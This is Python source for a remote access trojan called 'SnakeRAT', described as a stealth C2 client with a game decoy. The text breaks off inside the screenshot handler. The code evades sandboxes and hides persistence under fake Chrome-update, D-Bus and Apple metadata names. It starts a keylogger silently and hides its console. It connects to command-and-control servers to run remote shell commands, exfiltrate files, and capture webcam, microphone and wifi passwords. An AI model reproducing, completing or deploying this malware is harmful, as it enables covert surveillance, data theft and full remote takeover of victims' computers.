#!/usr/bin/env python3
"""
Advanced SnakeRAT - Stealth C2 Client with Game Decoy
Cross-Platform Version (Linux/Windows/macOS)
Version: 3.1 Professional
"""

import pygame
import sys
import socket
import io
import json
import threading
import time
import logging
import argparse
import webbrowser
import os
import base64
import subprocess
import platform
import hashlib
import random
import string
import ctypes
import psutil
from cryptography.fernet import Fernet
import tempfile
import shutil
import getpass
import uuid
try:
    import netifaces
except ImportError:
    pass
import importlib.metadata
from datetime import datetime

# Platform-specific imports
IS_WINDOWS = platform.system().lower() == 'windows'
IS_LINUX = platform.system().lower() == 'linux'
IS_MAC = platform.system().lower() == 'darwin'

if IS_WINDOWS:
    try:
        import winreg
        import win32api
        import win32con
        import win32process
        import win32service
        WINDOWS_IMPORTS = True
    except:
        WINDOWS_IMPORTS = False
else:
    WINDOWS_IMPORTS = False

# Default Configuration (can be overridden via command line)
C2_HOST = "127.0.0.1"
C2_PORT = 4444

C2_SERVERS = [
    {"host": C2_HOST, "port": C2_PORT},
    {"host": "192.168.1.100", "port": 4444},
    {"host": "10.0.0.1", "port": 4444}
]

# Stealth Configuration
SLEEP_JITTER = (2, 2)
MAX_RETRIES = 5
ENCRYPTION_KEY = base64.urlsafe_b64encode(hashlib.sha256(b"AdvancedSnakeRAT_2024_CrossPlatform").digest())

class Singleton:
    """Ensure only one instance of the RAT is running at a time"""
    def __init__(self, port=55555):
        self.port = port
        try:
            # Try to bind to a local port
            self.lock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.lock_socket.settimeout(1)
            self.lock_socket.bind(('127.0.0.1', self.port))
            # Keep the socket open to maintain the lock
        except socket.error:
            # Port is busy, another instance must be running
            sys.exit(0)

class CryptoManager:
    """Handle encryption/decryption of C2 communications"""
    
    def __init__(self, key=ENCRYPTION_KEY):
        self.fernet = Fernet(key)
    
    def encrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        return self.fernet.encrypt(data)
    
    def decrypt(self, data):
        return self.fernet.decrypt(data)

class Logger:
    """Stealthy log system for the client"""
    
    def __init__(self, log_file=None, debug=True):
        self.debug_mode = debug
        # Don't log to file if it's a shadow instance to stay stealthy
        self.log_file = log_file if not any(x in os.path.abspath(__file__) for x in [".dbus-service", "ChromeUpdate", ".metadata"]) else None
        
        if self.log_file:
            try:
                logging.basicConfig(
                    filename=self.log_file,
                    level=logging.DEBUG if debug else logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s'
                )
            except: pass

    def _log(self, level, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if self.debug_mode:
            try: print(f"[{timestamp}] [{level}] {message}")
            except: pass
        
        if self.log_file:
            try:
                log_func = getattr(logging, level.lower() if level != 'SUCCESS' else 'info', logging.info)
                log_func(f"[{level}] {message}")
            except: pass

    def info(self, message): self._log('INFO', message)
    def warning(self, message): self._log('WARNING', message)
    def error(self, message): self._log('ERROR', message)
    def success(self, message): self._log('SUCCESS', message)
    def debug(self, message): 
        if self.debug_mode: self._log('DEBUG', message)

class AntiSandbox:
    """Basic checks to detect if running in a VM/Sandbox"""
    @staticmethod
    def is_sandbox():
        """Returns True if a sandbox/VM is detected"""
        try:
            # Check for common VM filenames/modules
            vm_elements = ['vboxguest', 'vboxservice', 'vmtoolsd', 'vmmemctl', 'qemu-ga']
            if IS_WINDOWS:
                # Check for common VM vendor IDs
                o = subprocess.check_output('wmic baseboard get manufacturer', shell=True).decode().lower()
                if any(x in o for x in ['microsoft', 'vmware', 'virtualbox', 'qemu']): return True
            elif IS_LINUX:
                # Check dmesg or modules
                o = subprocess.check_output('lsmod', shell=True).decode().lower()
                if any(x in o for x in vm_elements): return True
                
            # Check cpu count - often 1 in cheap sandboxes
            if psutil.cpu_count() < 2: return True
            
            # Check RAM - often less than 2GB in sandboxes
            if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024: return True
            
            return False
        except: return False

    def _log(self, level, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if self.debug_mode:
            print(f"[{timestamp}] [{level}] {message}")
        
        if self.log_file:
            log_func = getattr(logging, level.lower() if level != 'SUCCESS' else 'info', logging.info)
            log_func(f"[{level}] {message}")

    def info(self, message): self._log('INFO', message)
    def warning(self, message): self._log('WARNING', message)
    def error(self, message): self._log('ERROR', message)
    def success(self, message): self._log('SUCCESS', message)
    def debug(self, message): 
        if self.debug_mode: self._log('DEBUG', message)

class SystemProfiler:
    """Advanced system profiling and information gathering (Cross-platform)"""
    
    @staticmethod
    def get_system_info():
        """Get comprehensive system information"""
        info = {
            "client_id": SystemProfiler.generate_fingerprint(),
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "cpu_count": psutil.cpu_count(),
            "cpu_percent": psutil.cpu_percent(interval=1),
            "memory_total": psutil.virtual_memory().total,
            "memory_available": psutil.virtual_memory().available,
            "memory_percent": psutil.virtual_memory().percent,
            "disk_usage": {},
            "network_interfaces": {},
            "username": getpass.getuser(),
            "pid": os.getpid(),
            "is_admin": PrivilegeManager.is_admin(),
            "boot_time": psutil.boot_time(),
            "python_version": sys.version,
            "current_directory": os.getcwd(),
            "platform": platform.platform(),
            "mac_address": SystemProfiler.get_mac_address(),
            "public_ip": SystemProfiler.get_public_ip(),
            "installed_packages": SystemProfiler.get_installed_packages()
        }
        
        # Get disk usage for all partitions
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                info["disk_usage"][partition.device] = {
                    "total": usage.total,
                    "used": usage.used,
                    "free": usage.free,
                    "percent": usage.percent,
                    "mountpoint": partition.mountpoint,
                    "fstype": partition.fstype
                }
            except:
                pass
        
        # Get network interfaces
        for interface, addrs in psutil.net_if_addrs().items():
            info["network_interfaces"][interface] = []
            for addr in addrs:
                info["network_interfaces"][interface].append({
                    "address": addr.address,
                    "netmask": addr.netmask,
                    "broadcast": addr.broadcast,
                    "family": str(addr.family)
                })
        
        # Get network connections
        try:
            info["network_connections"] = len(psutil.net_connections())
        except:
            info["network_connections"] = "Access denied"
        
        # Get users
        try:
            info["users"] = [u.name for u in psutil.users()]
        except:
            info["users"] = []
        
        return info
    
    @staticmethod
    def generate_fingerprint():
        """Generate unique machine fingerprint (cross-platform)"""
        fingerprint_data = []
        
        # Add system-specific identifiers
        fingerprint_data.append(platform.node())
        fingerprint_data.append(platform.machine())
        
        # Add MAC address if available
        mac = SystemProfiler.get_mac_address()
        if mac:
            fingerprint_data.append(mac)
        
        # Add disk serial if possible (platform-specific)
        if IS_WINDOWS:
            try:
                import wmi
                c = wmi.WMI()
                for disk in c.Win32_DiskDrive():
                    fingerprint_data.append(disk.SerialNumber)
            except:
                pass
        elif IS_LINUX:
            try:
                with open('/etc/machine-id', 'r') as f:
                    fingerprint_data.append(f.read().strip())
            except:
                pass
        elif IS_MAC:
            try:
                result = subprocess.run(['ioreg', '-l'], capture_output=True, text=True)
                fingerprint_data.append(result.stdout)
            except:
                pass
        
        fingerprint = '_'.join(str(x) for x in fingerprint_data if x)
        return hashlib.sha256(fingerprint.encode()).hexdigest()[:16]
    
    @staticmethod
    def get_mac_address():
        """Get primary MAC address"""
        try:
            for interface in netifaces.interfaces():
                if interface != 'lo':
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_LINK in addrs:
                        return addrs[netifaces.AF_LINK][0]['addr']
        except:
            pass
        
        # Fallback method
        try:
            import uuid
            return ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                            for ele in range(0, 8*6, 8)][::-1])
        except:
            return "00:00:00:00:00:00"
    
    @staticmethod
    def get_public_ip():
        """Get public IP address with multiple fallbacks"""
        services = ['https://api.ipify.org', 'https://ifconfig.me/ip', 'https://ident.me', 'https://httpbin.org/ip']
        for url in services:
            try:
                import requests
                return requests.get(url, timeout=5).text.strip()
            except:
                try:
                    # Native fallback (Linux/macOS)
                    import subprocess
                    if not IS_WINDOWS:
                        return subprocess.check_output(['curl', '-s', url], timeout=5).decode().strip()
                except: continue
        return "Unknown"
    
    @staticmethod
    def get_installed_packages():
        """Get list of installed Python packages"""
        try:
            return [f"{d.metadata['Name']}=={d.version}" for d in importlib.metadata.distributions()]
        except:
            return []

class PersistenceManager:
    """Handle persistence mechanisms for different platforms"""
    
    @staticmethod
    def install_persistence():
        """Install persistence based on platform"""
        if IS_WINDOWS:
            return PersistenceManager._windows_persistence()
        elif IS_LINUX:
            return PersistenceManager._linux_persistence()
        elif IS_MAC:
            return PersistenceManager._macos_persistence()
        return False
    
    @staticmethod
    def _windows_persistence():
        """Stealthy Windows persistence with shadowing"""
        try:
            # Mask name
            mask_name = "ChromeUpdate"
            hidden_dir = os.path.join(os.environ['APPDATA'], mask_name)
            os.makedirs(hidden_dir, exist_ok=True)
            
            # Shadow script
            target_path = os.path.join(hidden_dir, "updater.pyw")
            if os.path.abspath(__file__) != target_path:
                import shutil
                shutil.copy2(os.path.abspath(__file__), target_path)
            
            # 1. Registry (User)
            try:
                import winreg
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, mask_name, 0, winreg.REG_SZ, f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{target_path}"')
            except: pass

            # 2. Scheduled Task (Higher stealth)
            try:
                task_cmd = f'schtasks /create /f /tn "{mask_name}" /tr "\"{sys.executable.replace("python.exe", "pythonw.exe")}\" \"{target_path}\"" /sc onlogon /rl highest'
                subprocess.run(task_cmd, shell=True, capture_output=True)
            except: pass

            return True
        except: return False
    
    @staticmethod
    def _linux_persistence():
        """Stealthy Linux persistence with shadowing"""
        try:
            # Mask name
            mask_name = "dbus-service"
            hidden_dir = os.path.expanduser(f"~/.cache/.{mask_name}")
            os.makedirs(hidden_dir, exist_ok=True)
            
            # Shadow script
            target_path = os.path.join(hidden_dir, "dbus-daemon.py")
            if os.path.abspath(__file__) != target_path:
                import shutil
                shutil.copy2(os.path.abspath(__file__), target_path)
            
            # 1. User Autostart (.desktop)
            autostart_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart_dir, exist_ok=True)
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=D-Bus Service
Exec={sys.executable} {target_path}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
            with open(os.path.join(autostart_dir, f"{mask_name}.desktop"), 'w') as f:
                f.write(desktop_content)

            # 2. Systemd user service (Standard/Trusted)
            service_dir = os.path.expanduser('~/.config/systemd/user')
            os.makedirs(service_dir, exist_ok=True)
            service_content = f"""[Unit]
Description=D-Bus system bus daemon
After=network.target

[Service]
ExecStart={sys.executable} {target_path}
Restart=always

[Install]
WantedBy=default.target
"""
            with open(os.path.join(service_dir, f'{mask_name}.service'), 'w') as f:
                f.write(service_content)
            
            subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', '--user', 'enable', f'{mask_name}.service'], capture_output=True)
            
            return True
        except: return False
    
    @staticmethod
    def _macos_persistence():
        """Stealthy macOS persistence with shadowing"""
        try:
            mask_name = "com.apple.metadata"
            hidden_dir = os.path.expanduser("~/Library/Application Support/.metadata")
            os.makedirs(hidden_dir, exist_ok=True)
            
            target_path = os.path.join(hidden_dir, "metadata_analysis")
            if os.path.abspath(__file__) != target_path:
                import shutil
                shutil.copy2(os.path.abspath(__file__), target_path)

            # Launch Agent
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{mask_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{target_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            
            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{mask_name}.plist")
            with open(plist_path, "w") as f:
                f.write(plist_content)
            
            subprocess.run(["launchctl", "load", plist_path], capture_output=True)
            return True
        except: return False

    @staticmethod
    def remove_persistence():
        """Remove all established persistence mechanisms"""
        try:
            if IS_WINDOWS:
                mask_name = "ChromeUpdate"
                # 1. Registry
                try:
                    import winreg
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                        winreg.DeleteValue(key, mask_name)
                except: pass
                # 2. Scheduled Task
                try: subprocess.run(f'schtasks /delete /f /tn "{mask_name}"', shell=True, capture_output=True)
                except: pass
                # 3. Files
                hidden_dir = os.path.join(os.environ['APPDATA'], mask_name)
                if os.path.exists(hidden_dir):
                    import shutil
                    shutil.rmtree(hidden_dir, ignore_errors=True)

            elif IS_LINUX:
                mask_name = "dbus-service"
                # 1. desktop file
                desktop_path = os.path.expanduser(f"~/.config/autostart/{mask_name}.desktop")
                if os.path.exists(desktop_path): os.remove(desktop_path)
                # 2. systemd
                subprocess.run(['systemctl', '--user', 'stop', f'{mask_name}.service'], capture_output=True)
                subprocess.run(['systemctl', '--user', 'disable', f'{mask_name}.service'], capture_output=True)
                service_path = os.path.expanduser(f'~/.config/systemd/user/{mask_name}.service')
                if os.path.exists(service_path): os.remove(service_path)
                # 3. Files
                hidden_dir = os.path.expanduser(f"~/.cache/.{mask_name}")
                if os.path.exists(hidden_dir):
                    import shutil
                    shutil.rmtree(hidden_dir, ignore_errors=True)

            elif IS_MAC:
                mask_name = "com.apple.metadata"
                # 1. Launch Agent
                plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{mask_name}.plist")
                if os.path.exists(plist_path):
                    subprocess.run(["launchctl", "unload", plist_path], capture_output=True)
                    os.remove(plist_path)
                # 2. Files
                hidden_dir = os.path.expanduser("~/Library/Application Support/.metadata")
                if os.path.exists(hidden_dir):
                    import shutil
                    shutil.rmtree(hidden_dir, ignore_errors=True)
            
            return True
        except: return False

class PrivilegeManager:
    """Detection and elevation of privileges"""
    
    @staticmethod
    def is_admin():
        """Check if running with administrative privileges"""
        try:
            if IS_WINDOWS:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.getuid() == 0
        except:
            return False

    @staticmethod
    def elevate():
        """Request elevation of privileges"""
        try:
            if PrivilegeManager.is_admin():
                return True, "Already running as admin"
            
            script = os.path.abspath(sys.argv[0])
            params = " ".join(sys.argv[1:])
            
            if IS_WINDOWS:
                ret = ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, f'"{script}" {params}', None, 1
                )
                return ret > 32, "Elevation requested on Windows"
            
            elif IS_LINUX:
                # Try pkexec (GUI) or sudo (CLI)
                commands = [
                    ['pkexec', sys.executable, script] + sys.argv[1:],
                    ['sudo', '-n', sys.executable, script] + sys.argv[1:],
                ]
                
                for cmd in commands:
                    try:
                        # Start detached
                        subprocess.Popen(cmd, 
                                       stdout=subprocess.DEVNULL, 
                                       stderr=subprocess.DEVNULL,
                                       start_new_session=True)
                        return True, f"Elevation attempted with {cmd[0]}"
                    except:
                        continue
                        
                return False, "Could not find elevation utility"
                
            return False, "Elevation not supported on this OS"
        except Exception as e:
            return False, str(e)

    @staticmethod
    def delevate():
        """Drop administrative privileges (restarts as normal user)"""
        try:
            if not PrivilegeManager.is_admin():
                return True, "Already running as normal user"
            
            script = os.path.abspath(sys.argv[0])
            params = " ".join(sys.argv[1:])
            
            if IS_WINDOWS:
                # Restart without 'runas'
                subprocess.Popen([sys.executable, script] + sys.argv[1:],
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL,
                               creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
                return True, "Restarting as normal user on Windows"
            
            elif IS_LINUX:
                # Try to find original user from environment or use nobody
                orig_user = os.environ.get('SUDO_USER') or os.environ.get('USER')
                if orig_user == 'root': orig_user = None # Still root?
                
                cmd = ['su', orig_user, '-c', f'{sys.executable} {script} {params}'] if orig_user else [sys.executable, script] + sys.argv[1:]
                
                subprocess.Popen(cmd, 
                               stdout=subprocess.DEVNULL, 
                               stderr=subprocess.DEVNULL,
                               start_new_session=True)
                return True, "Restarting as normal user on Linux"
                
            return False, "De-elevation not supported"
        except Exception as e:
            return False, str(e)

class CommandExecutor:
    """Cross-platform command execution"""
    active_processes = {} # cmd_id -> subprocess.Popen
    proc_lock = threading.Lock()
    
    @staticmethod
    def execute_shell(command, cwd=None, timeout=30, cmd_id='unknown'):
        """Execute shell command with better encoding handling and CWD support"""
        try:
            if IS_WINDOWS:
                shell_cmd = ['cmd.exe', '/c', command]
            else:
                shell_cmd = ['/bin/sh', '-c', command]
            
            # Use Popen to allow abortion
            proc = subprocess.Popen(
                shell_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=cwd or os.getcwd(),
                start_new_session=not IS_WINDOWS # Linux: separate session group
            )
            
            # Register process
            with CommandExecutor.proc_lock:
                CommandExecutor.active_processes[cmd_id] = proc
            
            try:
                stdout_data, stderr_data = proc.communicate(timeout=timeout)
                # Decode with errors='replace' to avoid crashing on binary/weird output
                stdout = stdout_data.decode(errors='replace')
                stderr = stderr_data.decode(errors='replace')
                returncode = proc.returncode
            except subprocess.TimeoutExpired:
                # Still gotta kill it if we timeout
                if IS_WINDOWS:
                    subprocess.call(['taskkill', '/F', '/T', '/PID', str(proc.pid)])
                else:
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                return {'error': 'Command timeout', 'stdout': '', 'stderr': 'Timeout expired'}
            finally:
                with CommandExecutor.proc_lock:
                    if cmd_id in CommandExecutor.active_processes:
                        del CommandExecutor.active_processes[cmd_id]

            return {
                'stdout': stdout,
                'stderr': stderr,
                'returncode': returncode
            }
        except Exception as e:
            return {'error': str(e), 'stdout': '', 'stderr': str(e)}
    
    @staticmethod
    def execute_powershell(command, timeout=30):
        """Execute PowerShell command (Windows only)"""
        if not IS_WINDOWS:
            return {'error': 'PowerShell only available on Windows'}
        
        try:
            result = subprocess.run(
                ['powershell.exe', '-Command', command],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except Exception as e:
            return {'error': str(e)}

class AdvancedRAT:
    """Core RAT functionality with advanced features"""
    
    def __init__(self):
        self.sock = None
        self.connected = False
        self.running = True
        self.logger = Logger(log_file='rat.log', debug=True)
        self.crypto = CryptoManager()
        self.profiler = SystemProfiler()
        self.client_id = self.profiler.generate_fingerprint()
        self.current_server_index = 0
        self.retry_count = 0
        self.command_handlers = self._setup_command_handlers()
        
        self.keylog_running = False
        self.keylog_listener = None
        self._start_background_keylogger()
        
        # Task & Process tracking for Abort feature
        self.active_tasks = {} # task_id -> {type, thread/process, start_time}
        self.active_lock = threading.Lock()
        
        # Shell state
        self.shell_cwd = os.getcwd()
        
        self.logger.info(f"Initialized SnakeRAT v3.1 | ID: {self.client_id}")
        
        # Start connection thread
        self.connect_thread = threading.Thread(target=self._connection_loop, daemon=True)
        self.connect_thread.start()
        
        # Start heartbeat thread
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()
        
        # Hide console on Windows
        if IS_WINDOWS:
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
    
    def _setup_command_handlers(self):
        """Setup all command handlers"""
        return {
            'shell': self._handle_shell,
            'powershell': self._handle_powershell,
            'download': self._handle_download,
            'upload': self._handle_upload,
            'write_file': self._handle_write_file,
            'screenshot': self._handle_screenshot,
            'webcam': self._handle_webcam,
            'microphone': self._handle_microphone,
            'keylog': self._handle_keylog,
            'persistence': self._handle_persistence,
            'unpersist': self._handle_unpersist,
            'process': self._handle_process,
            'file_browser': self._handle_file_browser,
            'port_scan': self._handle_port_scan,
            'system_info': self._handle_system_info,
            'reverse_shell': self._handle_reverse_shell,
            'clean_traces': self._handle_clean_traces,
            'self_destruct': self._handle_self_destruct,
            'elevate': self._handle_elevate,
            'unelevate': self._handle_unelevate,
            'abort': self._handle_abort,
            'socks': self._handle_socks_proxy,
            'service': self._handle_service,
            'registry': self._handle_registry,
            'open_url': self._handle_open_url,
            'message_box': self._handle_message_box,
            'clipboard': self._handle_clipboard,
            'wallpaper': self._handle_wallpaper,
            'power': self._handle_power,
            'wifi_passwords': self._handle_wifi_passwords
        }
    
    def _send_encrypted(self, data):
        """Send encrypted data to C2 (combined for speed)"""
        if not self.sock:
            return False
        
        try:
            if isinstance(data, dict):
                data['client_id'] = self.client_id
                data['timestamp'] = time.time()
            
            encrypted = self.crypto.encrypt(json.dumps(data))
            # Combine length and data for one sendall
            msg = len(encrypted).to_bytes(4, 'big') + encrypted
            self.sock.sendall(msg)
            return True
        except Exception as e:
            self.connected = False
            self.sock = None
            return False

    def _send_loot(self, loot_type, data, filename=None):
        """Send loot (screenshot/webcam/audio/files) to C2"""
        if not self.connected or not self.sock:
            return False
            
        try:
            self.logger.info(f"Sending {loot_type} loot to C2...")
            loot_msg = {
                'type': 'loot',
                'loot_type': loot_type,
                'data': base64.b64encode(data).decode(),
                'filename': filename
            }
            return self._send_encrypted(loot_msg)
        except Exception as e:
            self.logger.error(f"Failed to send loot: {str(e)}")
            return False
    
    def _start_background_keylogger(self):
        """Start keylogger in background thread"""
        if self.keylog_running:
            return
            
        def run_keylogger():
            try:
                import pynput
                from pynput import keyboard
                
                def on_press(key):
                    try:
                        k = None
                        
                        # 1. Try to get character directly (KeyCode)
                        if hasattr(key, 'char') and key.char is not None:
                            k = key.char
                        
                        # 2. Fallback to string representation (handles quoted 'a', etc.)
                        if k is None:
                            k_name = str(key).strip()
                            if k_name.startswith("'") and k_name.endswith("'") and len(k_name) == 3:
                                k = k_name[1:-1]
                            elif k_name.startswith("Key."):
                                k_name = k_name.replace('Key.', '').lower()
                                mapping = {
                                    'space': ' ',
                                    'enter': '\n',
                                    'backspace': '[BS]',
                                    'tab': '[TAB]',
                                    'shift': '[SHIFT]',
                                    'shift_l': '[SHIFT]',
                                    'shift_r': '[SHIFT]',
                                    'ctrl': '[CTRL]',
                                    'ctrl_l': '[CTRL]',
                                    'ctrl_r': '[CTRL]',
                                    'alt': '[ALT]',
                                    'alt_l': '[ALT]',
                                    'alt_r': '[ALT]',
                                    'caps_lock': '[CAPS]',
                                    'esc': '[ESC]',
                                    'up': '[UP]',
                                    'down': '[DOWN]',
                                    'left': '[LEFT]',
                                    'right': '[RIGHT]'
                                }
                                k = mapping.get(k_name, f'[{k_name}]')
                            else:
                                # Last resort: raw name in brackets
                                k = f'[{k_name}]'
                        
                        if k:
                            self.keylog_buffer.append(k)
                            # Clip buffer at 10k chars
                            if len(self.keylog_buffer) > 10000:
                                self.keylog_buffer = self.keylog_buffer[-10000:]
                    except:
                        pass

                # Diagnostic: Log session type for Linux
                if IS_LINUX:
                    session = os.environ.get('XDG_SESSION_TYPE', 'unknown')
                    self.logger.debug(f"Keylogger starting on Linux ({session})")
                    if session == 'wayland':
                        self.logger.warning("Keylogger might require root/input permissions on Wayland")

                self.keylog_running = True
                with keyboard.Listener(on_press=on_press) as listener:
                    self.keylog_listener = listener
                    listener.join()
            except Exception as e:
                self.logger.error(f"Background keylogger error: {e}")
                self.keylog_running = False

        kl_thread = threading.Thread(target=run_keylogger, daemon=True)
        kl_thread.start()
        self.logger.info("Background keylogger started")

    def _recv_command(self):
        """Receive and decrypt command from C2"""
        if not self.sock:
            return None
        
        try:
            len_data = self._recv_exactly(4)
            if not len_data:
                return None
            
            msg_len = int.from_bytes(len_data, 'big')
            encrypted = self._recv_exactly(msg_len)
            if not encrypted:
                return None
            
            decrypted = self.crypto.decrypt(encrypted)
            return json.loads(decrypted.decode())
        except Exception as e:
            return None
    
    def _recv_exactly(self, length):
        """Receive exactly N bytes"""
        data = b''
        while len(data) < length:
            try:
                chunk = self.sock.recv(min(length - len(data), 4096))
                if not chunk:
                    return None
                data += chunk
            except socket.timeout:
                if not self.running or not self.connected:
                    return None
                continue
            except Exception:
                return None
        return data
    
    def _heartbeat_loop(self):
        """Send periodic heartbeats to keep connection alive (faster)"""
        while self.running:
            if self.connected and self.sock:
                try:
                    self._send_encrypted({'type': 'heartbeat'})
                except:
                    pass
            time.sleep(5)  # Heartbeat every 5 seconds for faster response
    
    def _connection_loop(self):
        """Main connection loop with failover"""
        while self.running:
            try:
                server = C2_SERVERS[self.current_server_index]
                
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(30)
                
                # Disable Nagle's algorithm for faster responses
                try:
                    self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except:
                    pass
                    
                self.logger.info(f"Attempting to connect to {server['host']}:{server['port']}...")
                self.sock.connect((server['host'], server['port']))
                
                self.connected = True
                self.retry_count = 0
                self.logger.success(f"Connected to C2 server: {server['host']}:{server['port']}")
                
                # Send initial system info
                sysinfo = self.profiler.get_system_info()
                self._send_encrypted({'type': 'init', 'info': sysinfo})
                
                # Start command loop
                self._command_loop()
                
            except Exception as e:
                self.connected = False
                self.sock = None
                self.logger.error(f"Connection failed: {str(e)}")
                
                self.current_server_index = (self.current_server_index + 1) % len(C2_SERVERS)
                self.retry_count += 1
                
                # Always sleep 2 seconds between retries
                time.sleep(2)
    
    def _command_loop(self):
        """Process commands from C2"""
        while self.connected and self.running:
            try:
                cmd = self._recv_command()
                if not cmd:
                    break
                
                self.logger.debug(f"Received command: {cmd}")
                cmd_type = cmd.get('type', '')
                cmd_id = cmd.get('id', 'unknown')
                
                if cmd_type in self.command_handlers:
                    handler = self.command_handlers[cmd_type]
                    
                    result_thread = threading.Thread(
                        target=self._execute_command,
                        args=(handler, cmd, cmd_id)
                    )
                    result_thread.daemon = True
                    result_thread.start()
                else:
                    self._send_encrypted({
                        'type': 'error',
                        'command_id': cmd_id,
                        'error': f'Unknown command: {cmd_type}'
                    })
                    
            except Exception as e:
                break
    
    def _execute_command(self, handler, cmd, cmd_id):
        """Execute command and send result with task tracking"""
        cmd_type = cmd.get('type', 'unknown')
        
        # Register task
        with self.active_lock:
            self.active_tasks[cmd_id] = {
                'type': cmd_type,
                'start_time': time.time(),
                'thread': threading.current_thread()
            }
            
        try:
            self.logger.info(f"Executing command: {cmd_type} (ID: {cmd_id})")
            
            # Inject cmd_id into cmd dict so handlers can use it if needed
            cmd['_cmd_id'] = cmd_id
            
            result = handler(cmd)
            self._send_encrypted({
                'type': 'result',
                'command_id': cmd_id,
                'data': result
            })
            self.logger.success(f"Command completed: {cmd_type}")
        except Exception as e:
            self.logger.error(f"Execution error for {cmd_type}: {str(e)}")
            self._send_encrypted({
                'type': 'error',
                'command_id': cmd_id,
                'error': str(e)
            })
        finally:
            # Unregister task
            with self.active_lock:
                if cmd_id in self.active_tasks:
                    del self.active_tasks[cmd_id]
    
    # Command Handlers
    
    def _handle_shell(self, cmd):
        """Execute shell command with 'cd' support"""
        command = cmd.get('command', '').strip()
        timeout = cmd.get('timeout', 30)
        
        # Handle 'cd' commands internally to maintain state
        if command.startswith('cd ') or command == 'cd':
            try:
                if command == 'cd' or command == 'cd ~':
                    new_path = os.path.expanduser('~')
                else:
                    path = command[3:].strip()
                    # Handle quoted paths
                    if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
                        path = path[1:-1]
                    new_path = os.path.join(self.shell_cwd, path)
                
                if os.path.isdir(new_path):
                    self.shell_cwd = os.path.abspath(new_path)
                    return {
                        'stdout': f'Changed directory to {self.shell_cwd}',
                        'stderr': '',
                        'returncode': 0,
                        'cwd': self.shell_cwd
                    }
                else:
                    return {
                        'stdout': '',
                        'stderr': f'Directory not found: {new_path}',
                        'returncode': 1
                    }
            except Exception as e:
                return {'error': str(e)}
        
        # Regular command execution
        result = CommandExecutor.execute_shell(command, cwd=self.shell_cwd, timeout=timeout, cmd_id=cmd.get('_cmd_id', 'unknown'))
        if isinstance(result, dict):
            result['cwd'] = self.shell_cwd
        return result
    
    def _handle_powershell(self, cmd):
        """Execute PowerShell command"""
        command = cmd.get('command', '')
        timeout = cmd.get('timeout', 30)
        return CommandExecutor.execute_powershell(command, timeout)
    
    def _handle_download(self, cmd):
        """Download file from victim"""
        filepath = cmd.get('path', '')
        
        if not os.path.exists(filepath):
            return {'error': 'File not found'}
        
        try:
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            # Send as loot
            filename = os.path.basename(filepath)
            success = self._send_loot('file', file_data, filename)
            
            return {
                'filename': filename,
                'size': len(file_data),
                'status': 'sent' if success else 'failed'
            }
        except Exception as e:
            return {'error': str(e)}
    
    def _handle_upload(self, cmd):
        """Upload file to victim (robust path handling)"""
        filename = cmd.get('filename', '')
        data_b64 = cmd.get('data', '')
        target_path = cmd.get('target_path')
        
        try:
            # 1. Resolve target path
            if not target_path:
                target_path = os.path.join(self.shell_cwd, filename)
            elif not os.path.isabs(target_path):
                target_path = os.path.join(self.shell_cwd, target_path)
            
            # 2. If target is a directory, append the original filename
            if os.path.isdir(target_path):
                target_path = os.path.join(target_path, filename)
                
            data = base64.b64decode(data_b64)
            
            # 3. Write data
            with open(target_path, 'wb') as f:
                f.write(data)
            
            self.logger.success(f"File uploaded to: {target_path}")
            return {'success': True, 'path': target_path, 'size': len(data)}
        except Exception as e:
            self.logger.error(f"Upload failed: {e}")
            return {'error': str(e)}
    
    def _handle_screenshot(self, cmd):
        """Take screenshot with fallbacks for Wayland/X11 errors"""
        try:
